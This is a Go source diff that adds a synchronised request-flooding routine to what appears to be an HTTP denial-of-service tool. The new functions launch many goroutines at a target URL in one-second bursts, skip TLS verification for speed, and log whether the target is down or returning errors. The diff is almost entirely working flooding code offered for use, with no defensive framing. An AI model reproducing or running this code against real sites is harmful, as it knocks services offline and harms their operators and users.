@@ -115,6 +115,75 @@ func New(m string, d int, t int, addr string) *TargetInf {
 	}
 }
 
+// makeRequest - alternative makeRequest() function for work together with syncedStart()
+func syncedMakeRequest(start <-chan struct{}, info *TargetInf) {
+	<-start
+
+	// Set Transport states
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // skip tls verify for more speed
+		Proxy:           http.ProxyFromEnvironment,             // use proxies from environment variables
+	}
+
+	// Initialize Client
+	hc := &http.Client{
+		Transport: tr,
+	}
+
+	result := make(chan *http.Request)
+	go buildRequest(result, info) // Building our request
+	req := <-result               // Wait for our request
+
+	r := runtime.NumGoroutine()
+	resp, err := hc.Do(req)
+	if err != nil {
+		//log.Printf("ERROR: do post request: %s\n", err) // FOR DEBUG
+		log.Printf("\tRoutine: %6d |    CONNECTION DOWN (DIAL ERROR) | %s\n", r, req.URL)
+
+		close(result) // Close request result channel
+
+	} else { // Catch some Error e.g. "socket: too many open files" or "socket: connection reset by peer"
+		defer resp.Body.Close() // Close response body at end of function
+
+		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
+			log.Printf("\tRoutine: %6d | HTTP Status is in the 2xx range | %s\n", r, req.URL)
+		} else {
+			log.Printf("\tRoutine: %6d |   Argh! Online but Broken [%3d] | %s\n", r, resp.StatusCode, req.URL)
+		}
+
+		close(result) // Close request result channel
+	}
+}
+
+// syncedStart - alternative start() function for synchronised start of syncedMakeRequest()
+// flooding comes in intervals of 1sec
+func syncedStart(ctx context.Context, info *TargetInf, done chan<- struct{}) {
+	// Build initial request (It's irrelevant if GET or POST cause we don't send this initial request to target)
+	func() {
+		log.Println("INFO: Building Initial Request")
+		result := make(chan *http.Request) // create channel result
+		go buildRequest(result, info)      // Building initial request
+		_ = <-result
+		close(result) // Wait for initial request to be done
+	}()
+
+	close(done)
+
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+			start := make(chan struct{})
+			for i := 1; i < info.threads+1; i++ {
+				go syncedMakeRequest(start, info)
+			}
+			close(start)
+			time.Sleep(1 * time.Second)
+		}
+	}
+}
+
 // makeRequest - handle our complete request workflow. Build Clients and Requests
 func makeRequest(done chan<- struct{}, info *TargetInf) {
 	// Set Transport states
@@ -137,6 +206,7 @@ func makeRequest(done chan<- struct{}, info *TargetInf) {
 	if err != nil {
 		//log.Printf("ERROR: do post request: %s\n", err) // FOR DEBUG
 		log.Printf("\tRoutine: %6d |    CONNECTION DOWN (DIAL ERROR) | %s\n", r, req.URL)
+
 		close(result) // Close request result channel
 		close(done)   // sending empty data to done channel
 	} else { // Catch some Error e.g. "socket: too many open files" or "socket: connection reset by peer"
